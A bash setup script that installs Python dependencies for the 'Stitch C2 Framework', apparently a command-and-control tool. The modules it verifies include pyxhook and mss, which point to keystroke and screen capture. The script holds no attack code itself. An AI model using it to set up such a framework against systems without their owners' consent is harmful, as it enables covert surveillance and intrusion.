#!/bin/bash
# Stitch C2 Framework - Dependency Installation Script
# This script installs all required dependencies

set -e

echo "🔧 Installing Stitch C2 Framework Dependencies..."

# Check if Python 3 is available
if ! command -v python3 &> /dev/null; then
    echo "❌ Python 3 is required but not installed."
    exit 1
fi

# Check if pip is available
if ! command -v pip3 &> /dev/null; then
    echo "❌ pip3 is required but not installed."
    exit 1
fi

# Upgrade pip first
echo "📦 Upgrading pip..."
python3 -m pip install --upgrade pip

# Install requirements
echo "📦 Installing core dependencies..."
pip3 install -r requirements.txt

# Verify installation
echo "✅ Verifying installation..."
python3 -c "
import flask
import flask_socketio
import Crypto
import psutil
import requests
import colorama
import mss
import pexpect
import pyxhook
print('✅ All dependencies installed successfully!')
"

echo "🎉 Stitch C2 Framework dependencies installed successfully!"
echo "🚀 You can now run: python3 START_SYSTEM.py"